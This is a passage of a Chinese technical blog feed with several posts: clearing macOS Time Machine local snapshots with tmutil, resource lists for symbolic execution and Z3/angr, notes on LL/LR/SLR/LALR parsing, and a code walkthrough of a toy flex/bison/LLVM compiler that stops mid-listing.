<h4 id="0x01-问题所在"><a href="#0x01-问题所在" class="headerlink" title="0x01 : 问题所在"></a>0x01 : 问题所在</h4><p>我使用了clean my mac各种搞事、清理空间，磁盘剩余空间到了200g。。但是我克隆还是失败 :(</p>
<p>于是打开磁盘工具查看，发现有150g空间的空间是可以清除的，就很好奇哪来的这么大的空间…</p>
<p>看了Apple官网，说是啥文件可以存iCloud，然后下载的时候用，就可以省下来一部分空间，可是我想了想，肯定不是这个啊，我iCloud一共才50g，而且才用了一半，这150g肯定不对。</p>
<p>后来在<a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">v2ex</a>看到了正解。</p>
<p>这是升级了10.13后的time machine搞的事，他有自动本地备份。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当 TM 打开后，如果备份介质不可用，那么 TM 不会停止工作，它依然会监控系统的运行，并建立本地快照，以达成 TM 的备份功能，比如如果你在此时不小心删除了一个文件，那么依然可以从 TM 中将它恢复，这是一个不错的功能。一旦你的备份介质可用，它会自动将快照移到（不是备份，是移动）备份介质中，以释放本地空间；而且它会依照当前系统分区的使用情况来确认自己建立本地快照的行为，简单说就是当本地空闲空间过少时，它会酌情删除旧的本地快照。</span><br></pre></td></tr></table></figure>
<p>大概就是这样的情况。</p>
<h4 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 : 解决"></a>0x02 : 解决</h4><h6 id="1-关闭本地备份"><a href="#1-关闭本地备份" class="headerlink" title="1. 关闭本地备份"></a>1. 关闭本地备份</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tmutil disablelocal</span><br></pre></td></tr></table></figure>
<p>但是我发现这个命令已经没了，好像是被移除了。</p>
<h6 id="2-删除本地备份"><a href="#2-删除本地备份" class="headerlink" title="2. 删除本地备份"></a>2. 删除本地备份</h6><p>只能先用<code>tmutil listlocalsnapshots [mount]</code>找本地备份，然后使用<code>tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS</code> 来删除。<br>下面是我的测试…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:12] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots</span><br><span class="line">Usage: tmutil listlocalsnapshots &lt;mount_point&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:25] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots /</span><br><span class="line">com.apple.TimeMachine.2018-03-09-011841</span><br><span class="line">com.apple.TimeMachine.2018-03-13-181325</span><br><span class="line">com.apple.TimeMachine.2018-03-13-191609</span><br><span class="line">com.apple.TimeMachine.2018-03-13-202018</span><br><span class="line">com.apple.TimeMachine.2018-03-13-211538</span><br><span class="line">com.apple.TimeMachine.2018-03-13-221327</span><br><span class="line">com.apple.TimeMachine.2018-03-14-001309</span><br><span class="line">com.apple.TimeMachine.2018-03-14-012200</span><br><span class="line">com.apple.TimeMachine.2018-03-14-030328</span><br><span class="line">com.apple.TimeMachine.2018-03-14-050253</span><br><span class="line">com.apple.TimeMachine.2018-03-14-064523</span><br><span class="line">com.apple.TimeMachine.2018-03-14-104506</span><br><span class="line">com.apple.TimeMachine.2018-03-14-115132</span><br><span class="line">com.apple.TimeMachine.2018-03-14-142419</span><br><span class="line">com.apple.TimeMachine.2018-03-14-152240</span><br><span class="line">com.apple.TimeMachine.2018-03-14-162236</span><br><span class="line">com.apple.TimeMachine.2018-03-14-163225</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:32]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-09-011841</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-09-011841'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:01:12]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-13-181325</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-13-181325'</span></span><br></pre></td></tr></table></figure>
<h4 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 : 参考"></a>0x03 : 参考</h4><p><a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">10.13 升级后，多出了很大一块隐藏空间，不能用也删除不了？– v2ex</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 起因&quot;&gt;&lt;/a&gt;0x00 : 起因&lt;/h4&gt;&lt;p&gt;Mac一直开着time machine备份数据，一直没出啥问题。&lt;br&gt;直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了)&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Symbolic Execution学习</title>
    <link href="http://o0xmuhe.me/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/"/>
    <id>http://o0xmuhe.me/2018/02/16/Symbolic-Execution学习/</id>
    <published>2018-02-16T09:36:48.000Z</published>
    <updated>2018-04-25T14:50:02.974Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>学习的时候做个记录，看过什么，踩过什么坑之类的(更新中…)</p>
<a id="more"></a>
<h4 id="0x01-资料"><a href="#0x01-资料" class="headerlink" title="0x01: 资料"></a>0x01: 资料</h4><h5 id="1-paper-amp-amp-不错的文章"><a href="#1-paper-amp-amp-不错的文章" class="headerlink" title="1. paper &amp;&amp; 不错的文章"></a>1. paper &amp;&amp; 不错的文章</h5><p>《All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)》</p>
<p>《Symbolic execution for software testing: three decades later》</p>
<p><a href="https://zhuanlan.zhihu.com/p/26927127" target="_blank" rel="noopener">符号执行入门</a></p>
<h5 id="2-项目"><a href="#2-项目" class="headerlink" title="2. 项目"></a>2. 项目</h5><p><a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md" target="_blank" rel="noopener">KLEE</a></p>
<p><a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">Z3</a></p>
<p><a href="https://github.com/angr" target="_blank" rel="noopener">Angr</a></p>
<h4 id="3-一些资源"><a href="#3-一些资源" class="headerlink" title="3. 一些资源"></a>3. 一些资源</h4><h5 id="3-1-z3"><a href="#3-1-z3" class="headerlink" title="3.1 z3"></a>3.1 z3</h5><p>主要是解决一些CTF题目。</p>
<ol>
<li><p><a href="https://zhuanlan.zhihu.com/p/30548907" target="_blank" rel="noopener">Z3一把梭：用约束求解搞定一类CTF题</a></p>
</li>
<li><p><a href="https://blog.csdn.net/s1054436218/article/details/78651075" target="_blank" rel="noopener">使用z3约束器解决CTF中的题目</a></p>
</li>
<li><p><a href="https://github.com/sam-b/z3-stuff/blob/master/a-bug-hunters-constraint-solver/README.md?1524556640719" target="_blank" rel="noopener">z3-stuf</a></p>
</li>
</ol>
<h5 id="3-2-angr"><a href="#3-2-angr" class="headerlink" title="3.2 angr"></a>3.2 angr</h5><ol>
<li><p><a href="https://github.com/angr/angr-doc" target="_blank" rel="noopener">angr-doc</a></p>
<p> 使用angr解决一些ctf题目，这部分直接参考angr-doc里的examples就好了。</p>
</li>
<li><p><a href="https://github.com/jakespringer/angr_ctf" target="_blank" rel="noopener">angr-ctf</a></p>
<p> 很好的入门资料，各种基础用法都有demo，注释很全面，跟着学习就好了。<br> 环境建议：Linux + virtualenv</p>
</li>
<li><p>关注各大ctf中wp</p>
</li>
</ol>
<h5 id="4-实践demo"><a href="#4-实践demo" class="headerlink" title="4. 实践demo"></a>4. 实践demo</h5><h5 id="1-mini-mc"><a href="#1-mini-mc" class="headerlink" title="1. mini mc"></a>1. <a href="https://github.com/xiw/mini-mc" target="_blank" rel="noopener">mini mc</a></h5><p>This directory contains a “minimal” implementation to demonstrate<br>the basic ideas of symbolic execution and concolic execution, using<br>Z3’s Python interface. </p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00: 前言&quot;&gt;&lt;/a&gt;0x00: 前言&lt;/h4&gt;&lt;p&gt;学习的时候做个记录，看过什么，踩过什么坑之类的(更新中…)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
      <category term="Symbolic Execution" scheme="http://o0xmuhe.me/tags/Symbolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>LL LR SLR LALR傻傻分不清</title>
    <link href="http://o0xmuhe.me/2018/02/11/LL-LR-SLR-LALR%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/"/>
    <id>http://o0xmuhe.me/2018/02/11/LL-LR-SLR-LALR傻傻分不清/</id>
    <published>2018-02-11T08:33:54.000Z</published>
    <updated>2018-02-11T09:03:49.166Z</updated>
    
    <content type="html"><![CDATA[<pre><code>撸公开课的时候被这几个文法绕晕了。搜了很多东西，合并整理方便后续查看。
</code></pre><a id="more"></a>
<h4 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01: 概念"></a>0x01: 概念</h4><p>  首先，LL文法是自顶向下，用的是推导；LR、SLR、LALR是自底向上，用的是规约。</p>
<h5 id="1-LL-1"><a href="#1-LL-1" class="headerlink" title="1. LL(1)"></a>1. LL(1)</h5><p>第一个L代表从左向右扫描输入符号串，第二个L代表产生最左推导，1代表在分析过程中执行每一步推导都要向前查看一个输入符号——当前正在处理的输入符号。<br>龙书上的判断规则是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">形如 A-&gt;a|β 这样的文法，满 足</span><br><span class="line">        ①FIRST(α)∩ FIRST (β ) =Φ</span><br><span class="line">        ②若ε∈ FIRST( α)， 要满足 FIRST(β) ∩FOLLOW(A)=Φ</span><br></pre></td></tr></table></figure>
<h5 id="2-LR-0"><a href="#2-LR-0" class="headerlink" title="2. LR(0)"></a>2. LR(0)</h5><p>如果某一文法能够构造一张分析表，使得表中每一个元素至多只有一种明确动作，则该文法称为LR文法。</p>
<p>具体来说：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、构造它的LR(0)项目集合的DFA（即识别该文法全部活前缀的DFA）；</span><br><span class="line">2、根据该DFA画出该文法的LR(0)分析表；</span><br><span class="line">3、在分析表中，每格要么只有一个内容，要么没有内容，（即无冲突）则为LR(0)文法。</span><br></pre></td></tr></table></figure>
<p>概括一下就是：见到First集就移进，见到终态就归约</p>
<h5 id="3-SLR-1"><a href="#3-SLR-1" class="headerlink" title="3. SLR(1)"></a>3. SLR(1)</h5><p>满足下面两个条件的文法是SLR(1)文法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.对于在s中的任何项目 A→α.Xβ,当X是一个终结符，且X在Follow(B)中时，s中没有完整的项目B→r.</span><br><span class="line"></span><br><span class="line">b.对于在s中的任何两个完整项目A→α.和 B→β.,Follow(A)∩Follow(B)为空。</span><br></pre></td></tr></table></figure>
<p>概括就是：见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。</p>
<h5 id="4-LALR-1"><a href="#4-LALR-1" class="headerlink" title="4. LALR(1)"></a>4. LALR(1)</h5><p>LALR即“Look-Ahead LR”。其中，Look-Ahead为“向前看”，L代表对输入进行从左到右的检查，R代表反向构造出最右推导序列。</p>
<h5 id="5-LR-1"><a href="#5-LR-1" class="headerlink" title="5. LR(1)"></a>5. LR(1)</h5><p>和LR(0)一致，只是构造自动机的时候多向前查看一个字符。</p>
<h4 id="0x02-关系与对比"><a href="#0x02-关系与对比" class="headerlink" title="0x02: 关系与对比"></a>0x02: 关系与对比</h4><h5 id="1-SLR-1-与LR-0-的关系："><a href="#1-SLR-1-与LR-0-的关系：" class="headerlink" title="1. SLR(1)与LR(0)的关系："></a>1. SLR(1)与LR(0)的关系：</h5><p>SLR(1)与LR(0)：简单的LR语法分析技术（即SLR（1）分析技术）的中心思想是根据文法构造出LR（0）自动机。</p>
<ul>
<li><p>LR(0):见到First集就移进，见到终态就归约</p>
</li>
<li><p>SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。</p>
</li>
</ul>
<h5 id="2-LR-1-与LR-0-的关系："><a href="#2-LR-1-与LR-0-的关系：" class="headerlink" title="2.  LR(1)与LR(0)的关系："></a>2.  LR(1)与LR(0)的关系：</h5><p>规范LR（1）语法分析技术的中心思想是根据文法构造出LR（1）自动机 ，而规范LR（1）自动机构造方法和LR（0）自动机的构造方法相同，只是多增加了向前搜索符号。</p>
<h5 id="3-规范LR-1-与LALR-1-的关系："><a href="#3-规范LR-1-与LALR-1-的关系：" class="headerlink" title="3. 规范LR(1)与LALR(1)的关系："></a>3. 规范LR(1)与LALR(1)的关系：</h5><p>LALR(1)是对LR(1)项集族I中具有同心项的项集进行合并得到I’，然后根据I’进行分析的方法。</p>
<h5 id="4-各种文法能力的对比"><a href="#4-各种文法能力的对比" class="headerlink" title="4. 各种文法能力的对比"></a>4. 各种文法能力的对比</h5><p><img src="http://blogimg-10065924.cossh.myqcloud.com/compilers/111.png" alt="cmp"></p>
<h4 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03: 引用"></a>0x03: 引用</h4><p><a href="https://www.cnblogs.com/yongzhewudi/p/6048301.html" target="_blank" rel="noopener">LL LR SLR LALR 傻傻分不清</a></p>
<p><a href="http://blog.csdn.net/linraise/article/details/9237195" target="_blank" rel="noopener">编译原理:LL(1),LR(0),SLR(1),LALR(1),LR(1)对比</a></p>
<p><a href="http://blog.csdn.net/carino_ly/article/details/24097889" target="_blank" rel="noopener">如何判断文法是LL(1)SLR(1)LR(1)LALR(1)的？</a></p>
<p><a href="https://zh.wikipedia.org/wiki/LALR%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%99%A8" target="_blank" rel="noopener">维基百科</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;撸公开课的时候被这几个文法绕晕了。搜了很多东西，合并整理方便后续查看。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="编译原理" scheme="http://o0xmuhe.me/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>compiler学习</title>
    <link href="http://o0xmuhe.me/2018/01/20/compiler%E5%AD%A6%E4%B9%A0/"/>
    <id>http://o0xmuhe.me/2018/01/20/compiler学习/</id>
    <published>2018-01-20T07:36:41.000Z</published>
    <updated>2018-05-27T07:12:24.094Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>一直想做的fuzzer涉及到很多语法相关的东西，编译原理相关的补课迫在眉睫-。- 不过也只能慢慢的来学习。这篇文章准备慢慢更新，涉及我的学习过程和对以前的大佬的一个toy compiler的学习，理论+实践才是王道。</p>
<a id="more"></a>
<h4 id="0x01-关于学习"><a href="#0x01-关于学习" class="headerlink" title="0x01:关于学习"></a>0x01:关于学习</h4><h5 id="1-公开课"><a href="#1-公开课" class="headerlink" title="1. 公开课"></a>1. 公开课</h5><h6 id="1-1-哈工大的编译原理"><a href="#1-1-哈工大的编译原理" class="headerlink" title="1.1 哈工大的编译原理"></a>1.1 哈工大的编译原理</h6><p>陈老师讲的超级好～慢慢看，看了下，这个是基于龙书讲的，当然没有展开很多，还是需要多下功夫去看看；</p>
<h6 id="1-2-中科大编译原理课程"><a href="#1-2-中科大编译原理课程" class="headerlink" title="1.2 中科大编译原理课程"></a>1.2 中科大编译原理课程</h6><p>这个也行，通俗易懂，但是个人感觉没有哈工大那个课程全面。</p>
<h6 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h6><p>个人感觉，概念太多，涉及的知识杂而广，所以有个大概印象，需要什么的时候再深入看会比较好一点。</p>
<h5 id="2-书"><a href="#2-书" class="headerlink" title="2. 书"></a>2. 书</h5><h6 id="2-1-龙书"><a href="#2-1-龙书" class="headerlink" title="2.1 龙书"></a>2.1 龙书</h6><pre><code>我是看不下去...好枯燥，也就下了个pdf，看公开课的时候用来当参考，一些概念记不清了就去翻一翻啥的。
</code></pre><h6 id="2-2-《自制编译器》"><a href="#2-2-《自制编译器》" class="headerlink" title="2.2 《自制编译器》"></a>2.2 《自制编译器》</h6><pre><code>这本不错，实践的一本书，不过，没有看过一些基础内容的就别看了，这本书没什么太多的基础内容介绍，就是上来就从词法分析、语法分析、代码生成一点一点地拿代码给你讲；是用java实现的一个类c语言的一个编译器。所以这本我是放在后面一点的位置再去看的，基本看完，但是需要结合去看他的代码，还需要仔细过一过。
</code></pre><h6 id="2-3-flex与bison"><a href="#2-3-flex与bison" class="headerlink" title="2.3 flex与bison"></a>2.3 flex与bison</h6><pre><code>这个不错两百多页的小薄本，但是内容很多，代码要好好消化，还是那句话，没有基础知识(from 龙书or公开课)，就算了，要不然看到作者写的那些代码理解起来很费劲。这本只看了部分，只到sql那个分析。
</code></pre><h6 id="2-4-现代编译器-虎书"><a href="#2-4-现代编译器-虎书" class="headerlink" title="2.4 现代编译器(虎书)"></a>2.4 现代编译器(虎书)</h6><pre><code>偏实践的一本，但是我没看 233333
</code></pre><h6 id="2-5-Antlr4-权威指南"><a href="#2-5-Antlr4-权威指南" class="headerlink" title="2.5 Antlr4 权威指南"></a>2.5 Antlr4 权威指南</h6><pre><code>有一定基础，推荐看。结合antlr4可以很快上手～ 而且这个东西应用十分广泛 -。- 比如在bug hunting的部分～
</code></pre><h5 id="3-实践项目"><a href="#3-实践项目" class="headerlink" title="3. 实践项目"></a>3. 实践项目</h5><h6 id="3-1-一个外国人写的toy-compiler，based-on-llvm"><a href="#3-1-一个外国人写的toy-compiler，based-on-llvm" class="headerlink" title="3.1 一个外国人写的toy compiler，based on llvm"></a>3.1 <a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/" target="_blank" rel="noopener">一个外国人写的toy compiler，based on llvm</a></h6><h6 id="3-2-《flex与bison》中的那个sql的解析挺不错的"><a href="#3-2-《flex与bison》中的那个sql的解析挺不错的" class="headerlink" title="3.2 《flex与bison》中的那个sql的解析挺不错的"></a>3.2 《flex与bison》中的那个sql的解析挺不错的</h6><h6 id="3-3-《自制编译器》中的cbc"><a href="#3-3-《自制编译器》中的cbc" class="headerlink" title="3.3 《自制编译器》中的cbc"></a>3.3 《自制编译器》中的cbc</h6><h6 id="3-4-llvm-文档中的Kaleidoscope"><a href="#3-4-llvm-文档中的Kaleidoscope" class="headerlink" title="3.4 llvm 文档中的Kaleidoscope"></a>3.4 llvm 文档中的Kaleidoscope</h6><h6 id="3-5-手把手教你构建-C-语言编译器"><a href="#3-5-手把手教你构建-C-语言编译器" class="headerlink" title="3.5 手把手教你构建 C 语言编译器"></a>3.5 <a href="http://lotabout.me/2015/write-a-C-interpreter-0/" target="_blank" rel="noopener">手把手教你构建 C 语言编译器</a></h6><h4 id="0x02-toy-compiler学习"><a href="#0x02-toy-compiler学习" class="headerlink" title="0x02 : toy compiler学习"></a>0x02 : toy compiler学习</h4><h5 id="1-基本情况"><a href="#1-基本情况" class="headerlink" title="1. 基本情况"></a>1. 基本情况</h5><p>老外写的一个简易的compiler，使用flex+bison做前端，llvm后端代码生成的一个demo。</p>
<p><a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/" target="_blank" rel="noopener">writing-your-own-toy-compiler</a></p>
<p><a href="https://github.com/lsegal/my_toy_compiler" target="_blank" rel="noopener">代码在GitHub上可以找到</a></p>
<h5 id="2-项目结构"><a href="#2-项目结构" class="headerlink" title="2. 项目结构"></a>2. 项目结构</h5><p>稍微复杂一些、大一些的项目，阅读之前最好搞明白项目的结构，这个toy compiler虽然代码量不大，但是最好还是搞明白结构，方便后面的阅读。</p>
<p>编译的流程是词法分析、语法分析、语义分析、代码生成。</p>
<p>根据这个过程去分(有些头文件在不同的过程中都会用到，比如node.h)：</p>
<ul>
<li><p>词法分析</p>
<p>tokens.l 、parser.hpp、node.h</p>
</li>
<li><p>语法分析</p>
<p>parser.y、node.h</p>
</li>
<li><p>代码生成</p>
<p>codegen.cpp、codegen.h、corefn.cpp</p>
</li>
<li><p>其他</p>
<p>main.cpp toy compiler的主体</p>
<p>example.txt 测试用例</p>
</li>
</ul>
<h5 id="3-代码阅读学习"><a href="#3-代码阅读学习" class="headerlink" title="3. 代码阅读学习"></a>3. 代码阅读学习</h5><h6 id="3-1-主体部分-main-cpp"><a href="#3-1-主体部分-main-cpp" class="headerlink" title="3.1 主体部分 main.cpp"></a>3.1 主体部分 main.cpp</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">yyparse();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; programBlock &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// see http://comments.gmane.org/gmane.comp.compilers.llvm.devel/33877</span></span><br><span class="line">InitializeNativeTarget();</span><br><span class="line">InitializeNativeTargetAsmPrinter();</span><br><span class="line">InitializeNativeTargetAsmParser();</span><br><span class="line">CodeGenContext context;</span><br><span class="line">createCoreFunctions(context);</span><br><span class="line">context.generateCode(*programBlock);</span><br><span class="line">context.runCode();</span><br></pre></td></tr></table></figure>
<p>调用yyparse解析输入，然后输出progranblock之后，使用llvm做代码生成。</p>
<h6 id="3-2-词法分析"><a href="#3-2-词法分析" class="headerlink" title="3.2 词法分析"></a>3.2 词法分析</h6><p>词法分析是使用flex做的，词法分析是把输入分割成token序列，在tokens.l中，定义了各种token。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[ \t\n]                            ;</span><br><span class="line">&quot;extern&quot;                        return TOKEN(TEXTERN);</span><br><span class="line">&quot;return&quot;                        return TOKEN(TRETURN);</span><br><span class="line">[a-zA-Z_][a-zA-Z0-9_]*  SAVE_TOKEN; return TIDENTIFIER;</span><br><span class="line">[0-9]+\.[0-9]*                 SAVE_TOKEN; return TDOUBLE;</span><br><span class="line">[0-9]+                            SAVE_TOKEN; return TINTEGER;</span><br><span class="line"></span><br><span class="line">&quot;=&quot;                                  return TOKEN(TEQUAL);</span><br><span class="line">&quot;==&quot;                              return TOKEN(TCEQ);</span><br><span class="line">&quot;!=&quot;                              return TOKEN(TCNE);</span><br><span class="line">&quot;&lt;&quot;                                  return TOKEN(TCLT);</span><br><span class="line">&quot;&lt;=&quot;                              return TOKEN(TCLE);</span><br><span class="line">&quot;&gt;&quot;                                  return TOKEN(TCGT);</span><br><span class="line">&quot;&gt;=&quot;                              return TOKEN(TCGE);</span><br><span class="line"></span><br><span class="line">&quot;(&quot;                                  return TOKEN(TLPAREN);</span><br><span class="line">&quot;)&quot;                                  return TOKEN(TRPAREN);</span><br><span class="line">&quot;&#123;&quot;                                 return TOKEN(TLBRACE);</span><br><span class="line">&quot;&#125;&quot;                                  return TOKEN(TRBRACE);</span><br><span class="line"></span><br><span class="line">&quot;.&quot;                                 return TOKEN(TDOT);</span><br><span class="line">&quot;,&quot;                                  return TOKEN(TCOMMA);</span><br><span class="line"></span><br><span class="line">&quot;+&quot;                                  return TOKEN(TPLUS);</span><br><span class="line">&quot;-&quot;                                  return TOKEN(TMINUS);</span><br><span class="line">&quot;*&quot;                                  return TOKEN(TMUL);</span><br><span class="line">&quot;/&quot;                                  return TOKEN(TDIV);</span><br></pre></td></tr></table></figure>
<p>匹配的话就是正则表达式的那种匹配原则，也就是说，在源码里遇到了对应的token，就返回{字面值，TOKEN名}这样的序列。不同的token类型，在parser.hpp中定义(宏定义)。</p>
<h6 id="3-2-语法分析"><a href="#3-2-语法分析" class="headerlink" title="3.2 语法分析"></a>3.2 语法分析</h6><p>这部分是使用了bison，从token序列依照提前定义好的语法规则，生成对应的ast。</p>
<p>规则在parser.y里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">program : stmts &#123; programBlock = $1; &#125;</span><br><span class="line">        ;</span><br><span class="line">        </span><br><span class="line">stmts : stmt &#123; $$ = new NBlock(); $$-&gt;statements.push_back($&lt;stmt&gt;1); &#125;</span><br><span class="line">      | stmts stmt &#123; $1-&gt;statements.push_back($&lt;stmt&gt;2); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">stmt : var_decl | func_decl | extern_decl</span><br><span class="line">     | expr &#123; $$ = new NExpressionStatement(*$1); &#125;</span><br><span class="line">     | TRETURN expr &#123; $$ = new NReturnStatement(*$2); &#125;</span><br><span class="line">     ;</span><br><span class="line"></span><br><span class="line">block : TLBRACE stmts TRBRACE &#123; $$ = $2; &#125;</span><br><span class="line">      | TLBRACE TRBRACE &#123; $$ = new NBlock(); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">var_decl : ident ident &#123; $$ = new NVariableDeclaration(*$1, *$2); &#125;</span><br><span class="line">         | ident ident TEQUAL expr &#123; $$ = new NVariableDeclaration(*$1, *$2, $4); &#125;</span><br><span class="line">         ;</span><br><span class="line"></span><br><span class="line">extern_decl : TEXTERN ident ident TLPAREN func_decl_args TRPAREN</span><br><span class="line">                &#123; $$ = new NExternDeclaration(*$2, *$3, *$5); delete $5; &#125;</span><br><span class="line">            ;</span><br><span class="line"></span><br><span class="line">func_decl : ident ident TLPAREN func_decl_args TRPAREN block </span><br><span class="line">            &#123; $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; &#125;</span><br><span class="line">          ;</span><br></pre></td></tr></table></figure>
<p>对表达式、代码块、变量定义，都有对应的语法规则。</p>
<p>作者设计的ast在node.h中，对于不同的语句，对应的ast也不同，这里举例了表达式声明和变量声明的ast设计：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//表达式声明</span></span><br><span class="line"><span class="keyword">class</span> NExpressionStatement : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    NExpression&amp; expression;</span><br><span class="line">    NExpressionStatement(NExpression&amp; expression) : </span><br><span class="line">        expression(expression) &#123; 